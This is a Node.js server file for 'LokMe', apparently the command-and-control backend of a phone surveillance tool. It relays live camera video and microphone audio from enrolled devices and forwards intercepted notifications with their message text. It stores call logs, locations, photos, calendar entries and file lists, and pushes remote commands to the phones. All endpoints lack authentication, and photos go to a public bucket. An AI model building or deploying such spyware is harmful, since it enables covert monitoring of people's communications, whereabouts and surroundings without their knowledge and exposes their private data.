require('dotenv').config();
const path = require('path');
const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '..', 'dashboard')));

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_KEY
);

const connectedDevices = new Map();
const dashboardClients = new Set();
const offlineTimers = new Map();
const OFFLINE_GRACE_MS = 2 * 60 * 1000;

function broadcastToDashboard(data) {
  const msg = JSON.stringify(data);
  dashboardClients.forEach(ws => {
    if (ws.readyState === 1) ws.send(msg);
  });
}

function sendDeviceListToDashboard() {
  const devices = Array.from(connectedDevices.keys());
  broadcastToDashboard({ type: 'device_list', devices });
}

function scheduleOffline(deviceId) {
  if (offlineTimers.has(deviceId)) return;
  const timer = setTimeout(async () => {
    offlineTimers.delete(deviceId);
    if (!connectedDevices.has(deviceId)) {
      try {
        await supabase.from('devices').update({ is_online: false }).eq('id', deviceId);
      } catch (e) {
        console.error('Failed to mark offline:', e.message);
      }
      sendDeviceListToDashboard();
    }
  }, OFFLINE_GRACE_MS);
  offlineTimers.set(deviceId, timer);
}

function cancelOffline(deviceId) {
  if (offlineTimers.has(deviceId)) {
    clearTimeout(offlineTimers.get(deviceId));
    offlineTimers.delete(deviceId);
  }
}

(async () => {
  try {
    await supabase.from('devices').update({ is_online: false }).neq('id', '');
    console.log('Reset all devices to offline on startup');
  } catch (e) {
    console.error('Failed to reset devices:', e.message);
  }

  try {
    const { data: buckets } = await supabase.storage.listBuckets();
    const exists = buckets?.some(b => b.name === 'photos');
    if (!exists) {
      await supabase.storage.createBucket('photos', { public: true });
      console.log('Created "photos" storage bucket');
    }
  } catch (e) {
    console.error('Bucket check/create error:', e.message);
  }
})();

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const isDashboard = url.searchParams.get('client') === 'dashboard';

  if (isDashboard) {
    dashboardClients.add(ws);
    console.log('Dashboard client connected');

    ws.send(JSON.stringify({
      type: 'device_list',
      devices: Array.from(connectedDevices.keys())
    }));

    ws.on('close', () => {
      dashboardClients.delete(ws);
      console.log('Dashboard client disconnected');
    });
    return;
  }

  console.log('Device WebSocket connection established');
  let deviceId = null;

  ws.on('message', async (data, isBinary) => {
    try {
      if (isBinary) {
        const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
        if (buf.length > 2) {
          const headerLen = (buf[0] << 8) | buf[1];
          if (headerLen > 0 && headerLen < buf.length - 2) {
            const headerJson = buf.slice(2, 2 + headerLen).toString('utf8');
            const header = JSON.parse(headerJson);
            const jpegData = buf.slice(2 + headerLen);

            if (header.type === 'video_frame' && header.device_id) {
              dashboardClients.forEach(dashWs => {
                if (dashWs.readyState === 1) {
                  const frameMsg = JSON.stringify({
                    type: 'video_frame',
                    device_id: header.device_id,
                    camera: header.camera || 'back'
                  });
                  dashWs.send(frameMsg);
                  dashWs.send(jpegData);
                }
              });
            }

            if (header.type === 'audio_frame' && header.device_id) {
              dashboardClients.forEach(dashWs => {
                if (dashWs.readyState === 1) {
                  const audioMsg = JSON.stringify({
                    type: 'audio_frame',
                    device_id: header.device_id,
                    sample_rate: header.sample_rate || 16000,
                    channels: header.channels || 1
                  });
                  dashWs.send(audioMsg);
                  dashWs.send(jpegData);
                }
              });
            }
          }
        }
        return;
      }

      const msg = JSON.parse(data.toString());

      switch (msg.type) {
        case 'register':
          deviceId = msg.device_id;
          connectedDevices.set(deviceId, { ws, lastSeen: Date.now() });
          cancelOffline(deviceId);
          console.log(`Device registered: ${deviceId}`);

          sendDeviceListToDashboard();

          await supabase.from('devices').upsert({
            id: deviceId,
            is_online: true,
            last_seen: new Date().toISOString()
          }, { onConflict: 'id' });
          break;

        case 'notification':
          try {
            broadcastToDashboard({
              type: 'notification',
              device_id: msg.device_id,
              device_name: msg.device_name || msg.device_id.substring(0,12),
              app_name: msg.app_name,
              sender: msg.sender,
              message: msg.message,
              timestamp: msg.timestamp
            });
          } catch (e) {
            console.error('Notification broadcast error:', e.message);
          }
          break;

        case 'response':
          console.log(`Response from ${msg.device_id}: ${msg.command_type} - ${msg.success}`);

          await supabase
            .from('commands')
            .update({ status: msg.success ? 'completed' : 'failed' })
            .eq('id', msg.command_id);

          broadcastToDashboard({
            type: 'device_response',
            device_id: msg.device_id,
            command_id: msg.command_id,
            command_type: msg.command_type,
            success: msg.success,
            data: msg.data
          });
          break;

        case 'heartbeat':
          if (connectedDevices.has(msg.device_id)) {
            connectedDevices.get(msg.device_id).lastSeen = Date.now();
          }
          cancelOffline(msg.device_id);
          await supabase
            .from('devices')
            .update({ last_seen: new Date().toISOString() })
            .eq('id', msg.device_id);
          break;
      }
    } catch (e) {
      console.error('WS message error:', e.message);
    }
  });

  ws.on('close', async () => {
    if (deviceId) {
      connectedDevices.delete(deviceId);
      console.log(`Device disconnected: ${deviceId}`);
      sendDeviceListToDashboard();
      scheduleOffline(deviceId);
    }
  });
});

// ===== REST API =====

app.get('/api/devices', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('devices')
      .select('*')
      .order('last_seen', { ascending: false });

    if (error) throw error;

    const devices = data.map(d => ({
      ...d,
      is_online: connectedDevices.has(d.id)
    }));

    res.json(devices);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.patch('/api/device/:id', async (req, res) => {
  try {
    const { id } = req.params;
    const { device_name } = req.body;
    if (!device_name || device_name.trim().length === 0) {
      return res.status(400).json({ error: 'device_name required' });
    }
    const { error } = await supabase.from('devices').update({ device_name: device_name.trim() }).eq('id', id);
    if (error) throw error;
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/command', async (req, res) => {
  try {
    const { device_id, command_type, payload } = req.body;

    if (!device_id || !command_type) {
      return res.status(400).json({ error: 'device_id and command_type required' });
    }

    const commandId = uuidv4();

    await supabase.from('commands').insert({
      id: commandId,
      device_id,
      command_type,
      payload: payload ? JSON.stringify(payload) : null,
      status: 'pending'
    });

    const device = connectedDevices.get(device_id);
    if (device && device.ws.readyState === 1) {
      device.ws.send(JSON.stringify({
        command_type,
        command_id: commandId,
        payload: payload ? JSON.stringify(payload) : ''
      }));
      res.json({ command_id: commandId, status: 'sent' });
    } else {
      await supabase
        .from('commands')
        .update({ status: 'device_offline' })
        .eq('id', commandId);
      res.json({ command_id: commandId, status: 'device_offline' });
    }
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/commands/:deviceId', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('commands')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('created_at', { ascending: false })
      .limit(50);

    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/device/:deviceId/location', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('locations')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('timestamp', { ascending: false })
      .limit(100);

    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/device/:deviceId/calllogs', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('call_logs')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('call_date', { ascending: false })
      .limit(100);

    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/device/:deviceId/photos', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('photos')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('created_at', { ascending: false })
      .limit(50);

    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/device/:deviceId/notifications', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('notifications')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('created_at', { ascending: false })
      .limit(200);

    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ===== DELETE ENDPOINTS =====

app.delete('/api/photos/:photoId', async (req, res) => {
  try {
    const { data: photo, error: fetchErr } = await supabase
      .from('photos')
      .select('*')
      .eq('id', req.params.photoId)
      .single();

    if (fetchErr) throw fetchErr;

    const urlParts = photo.storage_url.split('/storage/v1/object/public/photos/');
    if (urlParts.length > 1) {
      await supabase.storage.from('photos').remove([urlParts[1]]);
    }

    await supabase.from('photos').delete().eq('id', req.params.photoId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.delete('/api/device/:deviceId/photos', async (req, res) => {
  try {
    const { data: photos } = await supabase
      .from('photos')
      .select('storage_url')
      .eq('device_id', req.params.deviceId);

    if (photos && photos.length > 0) {
      const paths = photos.map(p => {
        const parts = p.storage_url.split('/storage/v1/object/public/photos/');
        return parts.length > 1 ? parts[1] : null;
      }).filter(Boolean);

      if (paths.length > 0) {
        await supabase.storage.from('photos').remove(paths);
      }
    }

    await supabase.from('photos').delete().eq('device_id', req.params.deviceId);
    res.json({ success: true, deleted: photos?.length || 0 });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.delete('/api/calllogs/:logId', async (req, res) => {
  try {
    await supabase.from('call_logs').delete().eq('id', req.params.logId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.delete('/api/device/:deviceId/calllogs', async (req, res) => {
  try {
    await supabase.from('call_logs').delete().eq('device_id', req.params.deviceId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.delete('/api/device/:deviceId/locations', async (req, res) => {
  try {
    await supabase.from('locations').delete().eq('device_id', req.params.deviceId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.delete('/api/device/:deviceId/notifications', async (req, res) => {
  try {
    await supabase.from('notifications').delete().eq('device_id', req.params.deviceId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.delete('/api/notifications/:notifId', async (req, res) => {
  try {
    await supabase.from('notifications').delete().eq('id', req.params.notifId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.delete('/api/device/:deviceId/commands', async (req, res) => {
  try {
    await supabase.from('commands').delete().eq('device_id', req.params.deviceId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.delete('/api/device/:deviceId', async (req, res) => {
  try {
    const id = req.params.deviceId;

    const { data: photos } = await supabase.from('photos').select('storage_url').eq('device_id', id);
    if (photos && photos.length > 0) {
      const paths = photos.map(p => {
        const parts = p.storage_url.split('/storage/v1/object/public/photos/');
        return parts.length > 1 ? parts[1] : null;
      }).filter(Boolean);
      if (paths.length > 0) await supabase.storage.from('photos').remove(paths);
    }

    await supabase.from('photos').delete().eq('device_id', id);
    await supabase.from('call_logs').delete().eq('device_id', id);
    await supabase.from('locations').delete().eq('device_id', id);
    await supabase.from('commands').delete().eq('device_id', id);
    await supabase.from('notifications').delete().eq('device_id', id);
    await supabase.from('devices').delete().eq('id', id);

    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ===== NEW FEATURE ENDPOINTS =====

app.get('/api/device/:deviceId/battery', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('battery_status')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('created_at', { ascending: false })
      .limit(20);
    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/device/:deviceId/calendar', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('calendar_events')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('start_time', { ascending: false })
      .limit(100);
    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/device/:deviceId/files', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('device_files')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('file_path', { ascending: true })
      .limit(500);
    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/device/:deviceId/refresh-battery', async (req, res) => {
  try {
    const { device_id, command_type } = { device_id: req.params.deviceId, command_type: 'GET_BATTERY' };
    const commandId = uuidv4();
    await supabase.from('commands').insert({ id: commandId, device_id, command_type, status: 'pending' });
    const device = connectedDevices.get(device_id);
    if (device && device.ws.readyState === 1) {
      device.ws.send(JSON.stringify({ command_type, command_id: commandId, payload: '' }));
      res.json({ status: 'sent' });
    } else {
      await supabase.from('commands').update({ status: 'device_offline' }).eq('id', commandId);
      res.json({ status: 'device_offline' });
    }
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/stats', async (req, res) => {
  try {
    const [devices, photos, callLogs, locations, commands, notifications] = await Promise.all([
      supabase.from('devices').select('id', { count: 'exact', head: true }),
      supabase.from('photos').select('id', { count: 'exact', head: true }),
      supabase.from('call_logs').select('id', { count: 'exact', head: true }),
      supabase.from('locations').select('id', { count: 'exact', head: true }),
      supabase.from('commands').select('id', { count: 'exact', head: true }),
      supabase.from('notifications').select('id', { count: 'exact', head: true }),
    ]);

    res.json({
      devices: devices.count || 0,
      photos: photos.count || 0,
      call_logs: callLogs.count || 0,
      locations: locations.count || 0,
      commands: commands.count || 0,
      notifications: notifications.count || 0
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    connected_devices: connectedDevices.size,
    dashboard_clients: dashboardClients.size
  });
});

app.post('/api/setup', async (req, res) => {
  try {
    const { data: buckets } = await supabase.storage.listBuckets();
    const exists = buckets?.some(b => b.name === 'photos');
    if (!exists) {
      await supabase.storage.createBucket('photos', { public: true });
    }
    res.json({ success: true, bucket_created: !exists });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`LokMe server running on port ${PORT}`);
  console.log(`WebSocket endpoint: ws://localhost:${PORT}/ws`);
  console.log(`Dashboard: http://localhost:${PORT}`);
});
